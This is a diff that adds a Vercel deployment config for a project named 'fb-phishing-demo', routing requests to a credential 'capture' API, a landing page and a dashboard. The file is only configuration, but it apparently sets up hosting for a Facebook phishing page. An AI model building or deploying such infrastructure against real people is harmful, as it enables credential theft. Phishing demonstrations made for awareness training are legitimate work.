@@ -1,0 +1,28 @@
+{
+  "version": 2,
+  "name": "fb-phishing-demo",
+  "builds": [
+    {
+      "src": "api/capture.js",
+      "use": "@vercel/node"
+    }
+  ],
+  "routes": [
+    {
+      "src": "/api/capture",
+      "dest": "/api/capture.js"
+    },
+    {
+      "src": "/",
+      "dest": "/index.html"
+    },
+    {
+      "src": "/dashboard",
+      "dest": "/dashboard.html"
+    },
+    {
+      "src": "/(.*)",
+      "dest": "/$1"
+    }
+  ]
+}
